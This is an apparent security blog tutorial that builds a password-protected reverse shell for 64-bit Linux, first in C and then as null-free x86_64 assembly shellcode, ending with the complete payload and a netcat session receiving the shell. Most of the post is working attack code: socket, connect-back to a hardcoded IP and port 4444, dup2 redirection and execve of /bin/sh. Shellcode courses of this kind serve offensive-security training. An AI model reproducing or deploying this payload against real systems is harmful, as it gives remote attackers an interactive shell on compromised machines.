---
title: "Implementing a password protected reverse shell in shellcode"
categories:
  - blog
---

The goal of the following blog post is to write shellcode for the Linux 64-bit architecture that will ultimately connect back to a remote machine and spawn a shell as well as requiring a password before any commands can be run inside the shell.

This blog post will follow a similar process to the bind shell process, but should be a little shorter seeing as a reverse shell is a little easier to implement in C, and Assembly, and because you should now be a little more familiar with most of the concepts.

We will step through the process again following the same framework:

<ol>
  <li>Firstly, we need to write the code, in the C Programming Language, for creating a socket and then connecting to a remote machine and password protecting it.</li>
  <li>Secondly, the C code needs to be ported to Linux x86_64 Assembly code.</li>
  <li>Lastly, all Null bytes need to be removed from the Assembly code and we need to look for opportunities to optimize our shellcode to keep the final payload as small as possible.</li>
</ol>

<h2>Writing a password protected reverse shell for Linux in C</h2>

<h3>What is a reverse shell?</h3>

A reverse shell is when a victim machine initiates a connection back to the attacker controller machine and spawns a shell upon connection. The reason we would want to use a reverse shell rather than a bind shell is usually to get past a firewall, that do not allow incoming connections, or a NAT solution. If we were to leave our compiled reverse shell lying around on a server that we tested for instance, then anybody would be able to use it. That is if the compiled binary accepts arguments, which ours does not in this case, but it should illustrate the point. In such a case, we hardcode the password so at least they will need to reverse engineer the binary, to find the password, before they can execute commands on the connect-back.

<h3>Creating the reverse shell</h3>

In the process of creating a bind shell, we will be stepping through 7 stages:

<ol>
  <li>Creating a new socket</li>
  <li>Initiate the connection back to remote server</li>
  <li>Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities.</li>
  <li>Wait for input (password) to be received and compare it against the correct password string</li>
  <li>Spawn the shell, if password is correct</li>
</ol>

Let's get started in coding out the reverse shell

<h3>Stage 1 - Creating a new socket</h3>

We will use the same skeleton program as before and import all our libraries and declare all variables:

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<string.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>


int main()
{
        struct sockaddr_in server;
        int sock;
        int sockaddr_len = sizeof(struct sockaddr_in);
        char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
        char buf[16];

}
```

Creating the socket is handled by the [socket](https://man7.org/linux/man-pages/man2/socket.2.html) syscall.

Referring to the man page for socket, it requires 3 arguments:

<ul>
    <li>Protocol Family - We will be using AF_INET (IPv4 Internet Protocols)</li>
    <li>Communication Type - We will use SOCK_STREAM (TCP)</li>
    <li>The third argument does not concern us so we will only pass 0</li>
</ul>

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
```

The return value for the above syscall will be a file descriptor for the new socket.

<h3>Stage 2 - Initiate the connection back to remote server</h3>

In this step we will construct our 'sockaddr' data structure and actually connect to our remote machine using the [connect](https://man7.org/linux/man-pages/man2/connect.2.html) syscall. Note that in this instance we will be using the localhost IP, but this can be changed to your remote IP Address.

The connect syscall takes 3 arguments:

<ul>
    <li>The socket to bind to - We will use our new socket "sock".</li>
    <li>Data structure of the remote attacker machine, which is essentially the IP Address and port that that will be bound to the socket. This data structure consists of 4 members that are each explained below.</li>
    <li>Length of the data structure passed in argument 2. This was declared during the skeleton code stage.</li>
</ul>

```c
server.sin_family = AF_INET; //Address Family
server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                             //htons converts host byte order to network byte order
server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
bzero(&server.sin_zero, 8); // 8 zero bytes of padding

connect(sock, (struct sockaddr *)&server, sockaddr_len);
```

<h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

For this stage we will be duplicating the file descriptor of our newly created socket and provide it with the basic shell capabilities. The [dup2](https://man7.org/linux/man-pages/man2/dup.2.html) syscall will do nicely for this purpose. We need to provide the file descriptor of our newly created socket and the integer assigned to STDIN (0), STDOUT (1) and STDERROR(2) to dup2.

```c
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
```

<h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>

Now that we have remote shell capabilities on our socket, let's wait for input (password) from the connection and compare it to the password that we have in memory. We will wait for and read input with the [read](https://man7.org/linux/man-pages/man2/read.2.html) syscall.

The read syscall accepts 3 arguments:

<ul>
<li>File descriptor of our newly created socket</li>
<li>Buffer - was assigned at the variables section of the code</li>
<li>Number of bytes to read from the file descriptor into the buffer</li>
</ul>

We will then use the [strcspn](https://man7.org/linux/man-pages/man3/strcspn.3.html) syscall to calculate the number of bytes in the buffer and using the [strcmp](https://man7.org/linux/man-pages/man3/strcmp.3.html) syscall to compare the string in the buffer with our hardcoded password in memory. If the two strings match, the strcmp syscall will return a 0, and our program will continue. If the two strings don't match, our program/shell will exit.

```c
read(sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[4], buf) == 0)
{        
      execve(arguments[0], &arguments[0], NULL);
}     
```

<h3>Stage 5 - Spawn the shell, if password is correct</h3>

So, if we have provided the correct password, our program/shell will continue and actually spawn our shell using the [execve](https://man7.org/linux/man-pages/man2/execve.2.html) syscall with the arguments that were configured in the variables section.

The execve syscall executes a program using:

<ul>
  <li>Pathname of the executable or script to run</li>
  <li>A pointer to the filename/executable and arguments passed to the executable. We do not have any arguments in this case, so just the pointer to our executable</li>
  <li>Environmental variables for use by the program - We set this to NULL as we are not concerned with this</li>
</ul>

All we need to do now is compile the C code into an elf binary and execute it. Hopefully, if we have done everything right, we will be presented with a shell upon connection back to our remote IP.

The code for the password protected reverse shell can be found [here](https://github.com/J33R4FF3/Pass_Rev_Shell).

<h2>Writing a password protected reverse shell in 64-bit Assembly</h2>

If you have not, by now, read the blogpost [here](https://j33r4ff3.github.io/blog/Creating-TCP-Bind-Shell-with-C_2/), I would encourage you to do so as it covers most of the Assembly concepts needed to understand this part of the process.

Ok, so if you have started reading this then I assume syscalls, registers and The Stack already makes sense to you and we can carry on coding our reverse shell in Assembly. As you might have noticed, the reverse shell has fewer stages and fewer syscalls as well as one new syscall. Let's map out the syscall we will be using in Assembly:

```nasm
read == 0
socket == 41
connect == 42
dup2 == 33
execve == 59
exit == 60
```

That is about all we require to start with our Assembly code, so let's put our skeleton program in place before we carry on.


```nasm
global _start

section .text

_start:

exit:
```

<h3>Stage 1 - Creating a socket</h3>

```c
sock = socket(AF_INET, SOCK_STREAM, 0);
```

Remember that we can use Python to easily find out the values, for AF_INET & SOCK_STREAM, that we need to pass in Assembly. Recall that the value for AF_INET needs to be 2 and the value for SOCK_STREAM needs to be 1. So let’s put together our first block of assembly code.

```nasm
mov rax, 41 ;Syscall number for socket
mov rdi, 2 ;Value for AF_INET
mov rsi, 1 ;Value for SOCK_STREAM
mov rdx, 0 ;Third argument where we need to pass a 0
syscall ;Give the syscall instruction

mov rdi, rax ;store file descriptor that is returned by the syscall in rdi for future use.
```

Again, if the block of code above makes no sense to you then go and read the previous blogposts first.

<h3>Stage 2 - Initiate the connection back to remote server</h3>

```c
server.sin_family = AF_INET; //Address Family
server.sin_port = htons(atoi(arguments[2])); //Network Byte order of the port to bind to. 
                                             //htons converts host byte order to network byte order
server.sin_addr.s_addr = inet_addr(arguments[3]); //Our remote IP Address defined in the variables (in this case localhost)
bzero(&server.sin_zero, 8); // 8 zero bytes of padding

connect(sock, (struct sockaddr *)&server, sockaddr_len);
```

```nasm
xor rax, rax

push rax
        
mov dword [rsp-4], 0x7b01a8c0 ;using private Ip of another machine
mov word [rsp-6], 0x5c11
mov word [rsp-8], 0x2
sub rsp, 8
        
mov rax, 42
mov rsi, rsp
mov rdx, 16
syscall       
```

<h3>Stage 3 - Map STDIN/STDOUT and STDERROR to the new socket for remote shell capabilities</h3>

This one is straight forward again, we just need to use dup2 three times for mapping the shell capabilities. You should be able to do these three by yourself now. Remember that we stored our file descriptor for our 'sock' in RDI already. 

```c
dup2(sock, 0);
dup2(sock, 1);
dup2(sock, 2);
```

```nasm
mov rax, 33
mov rsi, 0
syscall

mov rax, 33
mov rsi, 1
syscall

mov rax, 33
mov rsi, 2
syscall
```

<h3>Stage 4 - Wait for input (password) to be received and compare it against the correct password string</h3>

For this step, we will move our known password string, in reverse order, into a register and compare the string with whatever is passed back from the incoming connection. This operation is strictly 8 bytes and not the 16 bytes that we had in our C program (This is an area of improvement for future Assembly). If the two strings do not match, we jump to our 'exit' call and exit the program. Another important attribute of the 64-bit architecture is that it is little-endian, which basically means it will retrieve objects in reverse order. This effectively means that if we want to pass the string '8bytesss', then we need to pass it as 'sssetyb8' and in hex format. We can use python to retrieve our reverse order hex value for the 8 byte password we want to use:

```python
>>> password = '8bytesss'
>>> len(password)
8
>>> password[::-1]
'sssetyb8'
>>> password[::-1].encode('hex')
'7373736574796238'
```

```c
read(sock, buf, 16);
buf[strcspn(buf, "\n")] = 0;
if (strcmp(arguments[4], buf) == 0)
{        
      execve(arguments[0], &arguments[0], NULL);
} 
```

```nasm

        xor rax, rax ;zero out rax - read syscall number = 0
        push r10 ;move 8 zero bytes to the stack for storing the password
        mov rsi, rsp ;move the stack pointer to the 8 bytes into rsi for second argument 
        xor rdx, rdx ;make sure rdx is zero
        mov rdx, 8 ;move 8 into rdx for third argument - 8 in this case because our password only supports 8 bytes
        syscall ;syscall read instruction

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238 ;load password into rax in reverse order
        mov rdi, rsi ;load the 8 bytes received from the client into rdi        
        scasq ;scasq will compare rax with rdi
        jne exit ;if the two strings contained within rax and rdi do not match, then jump to our exit syscall instruction
        
exit:
        
        xor rax, rax ;zero out rax in case of any remnant values before attempting to exit
        mov rax, 60 ;syscall number for exit = 60
        syscall ;syscall exit instruction
```

<h3>Stage 5 - Spawn the shell, if password is correct</h3>

So, if we entered the correct password then the code would have jumped over the jne (jump if not equal) instruction and continued on to our execve code where we will actually launch our /bin/sh shell. We will once again be using the stack for this one and to do this we need to clearly understand how execve accepts the arguments. We will not be passing any commandline arguments or environmental variable arguments, so it should look something like this:

<table style="width:100%">
  <tr>
    <th>First Argument</th>
    <th>Second Argument</th>
    <th>Third Argument</th>
  </tr>
  <tr>
    <th>rdi</th>
    <th>rsi</th>
    <th>rdx</th>
  </tr>
  <tr>
    <td>pathname - Filename of executable and optional arguments</td>
    <td>argv - Pointer to the address of our filneame and optional commandline arguments</td>
    <td>envp - Optional environmental variables</td>
  </tr>
  <tr>
    <td>/bin/sh, 0x0</td>
    <td>Address of /bin/sh, 0x0000000000000000</td>
    <td>0x0000000000000000</td>
  </tr>
</table>

We are using the stack so we will have to construct this command in reverse order. Remember that if we want to pass /bin//sh (we add a / to make it a nice 8 bytes, this has no affect on how the OS interprets it), then we need to pass it as hs//nib/ and in hex format. We can easily use python for this once again though.

```python
shell = '/bin//sh'
shell[::-1]
'hs//nib/'
shell[::-1].encode('hex')
'68732f2f6e69622f'
```

```nasm
        
xor rax, rax ;zero out rax
push rax ;push 8 zero bytes onto the stack for third argument 

mov rbx, 0x68732f2f6e69622f ;move the /bin//sh string to rbx register
push rbx ;push the value onto the stack

mov rdi, rsp ;the stack pointer now points to /bin//sh on the stack for first argument

push rax ;add another 8 zero bytes on the stack

mov rdx, rsp ;the stack pointer now points to 8 zero bytes, so lets move that into rdx for third argument

push rdi ;rdi is currently pointing to the address of /bin//sh so lets put that on the stack
mov rsi, rsp ;move the stack pointer for address of /bin//sh into rsi for second argument
mov rax, 59 ;syscall number for execve
syscall ;execve syscall instruction
```

And that should do it, we can now compile our program and it should connect back our attacker server (in this instance I used a different Ip to localhost) and present us with a nice shell.

```bash
┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ nasm -felf64 Pass_Rev_Shell.nasm -o rev.o

┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ ld rev.o -o rev

┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ ./rev

➜  ~ nc -nlv 4444
8bytesss
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)
```
<h2>Removing null bytes from generated shellcode</h2>

Ok, so you know the drill by now. Our Assembly code will not work because of the nullbytes in our code:

```bash
┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ objdump -d rev.o | grep 00                                       144 ⨯
0000000000000000 <_start>:
   0:   b8 29 00 00 00          mov    $0x29,%eax
   5:   bf 02 00 00 00          mov    $0x2,%edi
   a:   be 01 00 00 00          mov    $0x1,%esi
   f:   ba 00 00 00 00          mov    $0x0,%edx
  2c:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
  37:   b8 2a 00 00 00          mov    $0x2a,%eax
  3f:   ba 10 00 00 00          mov    $0x10,%edx
  46:   b8 21 00 00 00          mov    $0x21,%eax
  4b:   be 00 00 00 00          mov    $0x0,%esi
  52:   b8 21 00 00 00          mov    $0x21,%eax
  57:   be 01 00 00 00          mov    $0x1,%esi
  5e:   b8 21 00 00 00          mov    $0x21,%eax
  63:   be 02 00 00 00          mov    $0x2,%esi
  75:   ba 08 00 00 00          mov    $0x8,%edx
  aa:   b8 3b 00 00 00          mov    $0x3b,%eax
00000000000000b1 <exit>:
  b4:   b8 3c 00 00 00          mov    $0x3c,%eax
```

Let's firstly use our 8-bit register technique to get rid of most of the nullbytes in our move instructions.

```bash
┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ objdump -d rev.o | grep 00               
0000000000000000 <_start>:
  23:   66 c7 44 24 f8 02 00    movw   $0x2,-0x8(%rsp)
  39:   40 b6 00                mov    $0x0,%sil
000000000000008d <exit>:
```

We will again use 'byte' instead of 'word' to move our value to the stack and then use a zero'ed out register to move a zero value into RSI. We then end up with no more null bytes in our shellcode:

```bash
┌──(kali㉿kali)-[~/Pass_Rev_Shell/Pass_Rev_Shell]
└─$ objdump -d rev.o | grep 00
0000000000000000 <_start>:
0000000000000091 <exit>:
```

Our final Shellcode Assembly looks as follows:

```nasm
global _start

section .text

_start:

        mov al, 41
        mov dil, 2
        mov sil, 1
        mov dl, r11b ;use a zero'ed register to move zero value into rdx
        syscall

        mov rdi, rax

        xor rax, rax

        push rax
        ; change IP as reverse hex as needed
        mov dword [rsp-4], 0x7b01a8c0
        mov word [rsp-6], 0x5c11
        mov byte [rsp-8], 0x2 ;change from word to byte to only move 1 byte into the stack
        sub rsp, 8
        
        mov al, 42
        mov rsi, rsp
        mov dl, 16
        syscall

        xor rax, rax
        xor rsi, rsi
        mov al, 33
        mov rsi, rbx ;zero'ed register to move zero into RSI
        syscall

        mov al, 33
        mov sil, 1
        syscall

        mov al, 33
        mov sil, 2
        syscall

        xor rax, rax

        push r10
        mov rsi, rsp
        
        xor rdx, rdx
        mov dl, 8
        syscall

        xor rax, rax
        ; password '8bytesss'
        mov rax, 0x7373736574796238
        mov rdi, rsi
        scasq
        jne exit

        xor rax, rax
        push rax

        mov rbx, 0x68732f2f6e69622f
        push rbx

        mov rdi, rsp

        push rax

        mov rdx, rsp

        push rdi
        mov rsi, rsp
        mov al, 59
        syscall

exit:
        xor rax, rax
        mov al, 60
        syscall
```
